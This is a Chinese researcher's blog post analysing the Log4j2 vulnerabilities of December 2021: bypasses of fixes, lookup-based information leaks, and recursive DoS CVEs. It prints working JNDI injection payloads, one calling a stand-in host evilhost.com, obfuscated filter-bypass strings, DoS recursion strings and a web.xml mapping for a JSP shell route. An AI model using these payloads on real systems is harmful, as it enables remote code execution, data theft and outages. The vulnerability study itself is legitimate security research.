# 闲谈log4j2

## log4j2爆炸漏洞

简单的说一下最近这个log4j2漏洞吧，这个漏洞自己也跟了有一段时间了。第一次在学长那听到了这个漏洞，当时只是跟但了jndi注入点并没有发现漏洞的入口，也就是${jndi:ldap://127.0.0.1/exp}.一方面是没有想到这个功能，但是之后感觉官方文档里面说了[文档](https://logging.apache.org/log4j/2.x/manual/lookups.html#JndiLookup)，可能是自己语文水平不太好。(有点吃亏。。。

## 挖掘新问题

然后就是复现漏洞。挖新的问题。当时第一时间感觉这个东西肯定有问题，第一时间就想到了dos。

![image-20211218215051277](https://user-images.githubusercontent.com/63966847/146644571-d87566e9-ac55-44f7-aaf3-0a64beb97b01.png)


当时因为环境没有配置起就去睡觉了，当时已经是晚上的3点了。

说一下我当时发现的dos问题大致是因为数组长度我们可以控制造成溢出。第二天中午我大哥就提交了dos漏洞。之后就没有管了。

## 绕过rc1

在然后说一下绕过rc1吧这个东西虽然简单但是我调试了一下午，大概是因为对异常没有处理，也就是在catch中没有return，导致程序会继续执行。

![Q`X GHE7UL3 IBYUAB0EFW](https://user-images.githubusercontent.com/63966847/146644576-d80164ab-1879-4e01-a50e-626f1c99bf5e.png)


所以绕过思路就直接让new url(name) 抛出异常就欧克。

tips:和bypass7u21差不多。。。

## 修复问题

```
今天看陈师傅写的文章，也就是修复log4j的坑。
在漏洞报出来的时候修复的方法是：

1.设置配置文件参数 log4j2.formatMsgNoLookups=true,
2.vm启动环境参数 -Dlog4j2.formatMsgNolookups=true,
3,设置系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为true
而这样的修复是打破这个判断
```

![image-20211215142114290](https://user-images.githubusercontent.com/63966847/146644579-6ed47eaf-8666-42ed-be31-7a01d83d860c.png)


认真看该代码其实在下面还有一个入口。


![image-20211215142251448](https://user-images.githubusercontent.com/63966847/146644583-ac2f76eb-028d-4afb-8f72-e5848746b49c.png)

可以看到判断条件是 **msg instanceof StringBuilderFormattable**

所以可以走第二个入口就绕过了log4j2.formatMsgNoLookups=true的判断

```java
log.printf(Level.ERROR,"${jndi:ldap://127.0.0.1:2333}");
```

>https://mp.weixin.qq.com/s?__biz=MzIxNDAyNjQwNg==&mid=2456098698&idx=1&sn=8c66b476cb303bdf413337bc5c92e127&chksm=803c6643b74bef55d1606a424e555ef09e27b8736928acdca027332453c6d9e4d7a11d7e589d&mpshare=1&scene=23&srcid=1215Twk8iymC8x9gXD72dMTK&sharer_sharetime=1639550097318&sharer_shareid=20feca07eb3065d70e5194c2cdd097b3#rd
>
>https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg

## 信息泄露

信息泄露这个问题我在漏洞刚刚出来的那天晚上就想到了，只是对比rce，信息泄露就微不足道。因为log4j2支持很多协议 sys等等可以看到env等等这些的信息，然后通过dns带出来。

不过值得说一下其中有一个思路通过ResourceBundleLookup类去获得读取项目中后缀为properties的配置文件，其中就可能有username/password。当时我是看到了只是不知道这个方法是干啥子的也没有去百度。。。哭死了。

https://mp.weixin.qq.com/s?__biz=Mzg4OTExMjE2Mw==&mid=2247483945&idx=1&sn=b15b68d95da83bb20f1b3496396f823a&chksm=cff19125f88618338373a32f98be3d2a9497b464d6531658c2aa96f4872c23eed294441917b5&mpshare=1&scene=23&srcid=1211aS0Tghr1agBnBRlwwGTw&sharer_sharetime=1639232420884&sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd

https://www.cnblogs.com/jona-test/p/11399218.html

更新 2021/12/24

看了大哥4ra1n的文章 https://xz.aliyun.com/t/10659

其中学习了dns（DNS协议是属于JNDI协议的） 可以带出数据 nc -lvup 通过udp接

![image](https://user-images.githubusercontent.com/63966847/147314294-222e4af5-98b3-4eac-863a-64316c775f91.png)

然后就是回显的问题，通过报错来回显，其中port本该是int如果给它无法转int的字符串就会抛出这里的信息(触发RuntimeException)，并且ignoreExceptions配置为false。触发RuntimeException()

而NumberFormatException就是触发RuntimeException的子类。

${jndi:ldap://x.x.x.x:${java:version}/xxx}

## bypass

这个东西太多了，在tw一看就很多很多。一方面是因为一些协议可以返回输入的值比如：lower data

还有一个bypass思路是因为执行解析log4j2中的${}问题。简单的说也是将${::-x}解析成x

```
${jn${::-d}i:ldap://127.0.0.1:8880/}
```

## cve-dos

大哥成功获得apache的cve。https://xz.aliyun.com/t/10670

简单的看了一下发现里面的思路和我不一样，大哥是想到了网络连接，也就可以存在一个网络超时的问题，而且log4j2支持递归解析。。所以就让他一直解析网络超时的ip...造成dos.

在这个cve通报中发现存在rce?简单的看了一下，我的理解是因为配置文件配置的这一次解析问题,如下配置中就有$${}这样。

```
<Appenders>
    <Console name="STDOUT" target="SYSTEM_OUT">
        <PatternLayout>
            <pattern>%d %p %c{1.} [%t] $${ctx:loginId} %m%n</pattern>
        </PatternLayout>
    </Console>
</Appenders>
```

而其中里面了ctx协议ContextMapLookup类，简单的说大概就是将我们解析的东西放到map里面然后在取出来。取出来之后在解析${xxxx}就造成了rce问题/dos问题。

## bypass 2.15

昨天在tw上看到了bypass 2.15版本,这个东西还没有具体去复现。不过看了一下exp大致懂了。。

```
${jndi:ldap://127.0.0.1#evilhost.com:1389/exp}
```

不过环境要求比较严格而且真实环境的rce可能比较可能。。。

2021/12/20更新

今天看到了大哥写的bypass 2.15 rce分析简单的记录一下 https://xz.aliyun.com/t/10689

利用条件

1.开启lookup功能

2.macos系统

3.泛域名解析

4.本地存在gadget

该exp通过去绕过了ip限制并且可以解析远程恶意ip(macos系统

```
${jndi:ldap://127.0.0.1#evilhost.com:1389/exp}
```

然后去绕过ldap服务的限制。


![image-20211220183446609](https://user-images.githubusercontent.com/63966847/146754506-bccfb16a-57e0-40d6-be17-36cbe67705a7.png)



正常情况是直接通过Reference去利用，不过这里不能使用Reference，所以就利用deserializeObject，其实就是bypass jdk8u191。满足本地存在gadget。只是需要把classname换成基本数据类型。去绕过**if (!allowedClasses.contains(className))**

也其实就是我们在了ldap的时候的思路 **LDAP服务攻击一般是先测Reference再测deserializeObject**

![image-20211220183705875](https://user-images.githubusercontent.com/63966847/146754481-8d5aff45-fa12-4593-9165-ace4aa0257bd.png)



## CVE-2021-45105

这个漏洞我看了下没有看太懂，也就不这么介绍了反正大概介绍递归解析的问题。

```java
${${::-${::-$${::-$}}}}
|
|
${::-${::-$${::-$}}}
然后在 this.substitute(event, bufName, 0, bufName.length());
|
|
::-::-$${::-$}
然后在 this.substitute(event, bufName, 0, bufName.length());
|
|
::-$${::-$}
|
|
${::-$}
|
|
::-$ 会进入一个异常
```
![image](https://user-images.githubusercontent.com/63966847/146945232-9157632d-2463-4d2c-976d-544e49ff249c.png)


~~说不定其他解析表达式也存在。。。。~~


https://www.zerodayinitiative.com/blog/2021/12/17/cve-2021-45105-denial-of-service-via-uncontrolled-recursion-in-log4j-strsubstitutor

https://github.com/apache/logging-log4j2/commit/806023265f8c905b2dd1d81fd2458f64b2ea0b5e#diff-3f056c67add25837df0d7d8b8ab22df492dc14e3c5bae5f2914e69ac8af8d5cc

更新 2021/12/22

https://mp.weixin.qq.com/s?__biz=MzU5MjEzOTM3NA==&mid=2247490570&idx=1&sn=279f4c19c266dd2f443088e33786f867&chksm=fe25190bc952901d1a754f78802b3dd1fd1d3107cd0d92f54b62c64797e966962427ca989126&mpshare=1&scene=23&srcid=1222cs3lrxzG5cIJHSfdgcOe&sharer_sharetime=1640169352847&sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd


```
在配置文件中配置：$${ctx:apiVersion}   则输入 ${${ctx:apiVersion}}或${${::-${::-$${::-aaa}}}}则可以造成递归dos
在配置文件中配置：${ctx:apiVersion}   则输入${${::-${::-$${::-dos}}}}则可以造成递归dos
```

## 更新

cve:https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/

[聊聊配置文件 RCE 这件事](https://mp.weixin.qq.com/s?__biz=Mzg4MzYxODA4Mw==&mid=2247484028&idx=1&sn=5748c6b75530a786f1bf0622616413c6&chksm=cf45fa30f83273269da4884f82c5d4ce43089d6ba8a7b6470e35f963d690ec781faa85ab48e1&mpshare=1&scene=23&srcid=12298p7j6KLY39FVuwNzmFRD&sharer_sharetime=1640749370687&sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd)

不愧是师傅总结的不错，简单的说就是通过配置文件去rce.
突然又想到了一个：web.xml里面添加servlet去实现解析一句话。
访问/exp路由就会解析

![image](https://user-images.githubusercontent.com/63966847/147626724-576ba23e-7fdf-4b73-b591-095af4578f8a.png)

```xml
<servlet>
<servlet-name>xxx</servlet-name>
<jsp-file>/WEB-INF/1.jsp</jsp-file>
</servlet>
<servlet-mapping>
<servlet-name>xxx</servlet-name>
<url-pattern>/exp</url-patten>
</servlet-mapping>
```


## 总结一下

主要是自己的问题，

第一点是读文档的习惯少导致不理解其中的意思失去第一时间拥有exp

第二点是自己没有考虑到dos中的网络连接超时问题。

第三点是自己发现了ResourceBundleLookup类却不知道其意思导致失去新思路的发现。

（如果官方在删除lookup功能我相信还会有更多的漏洞。。。。。。。。
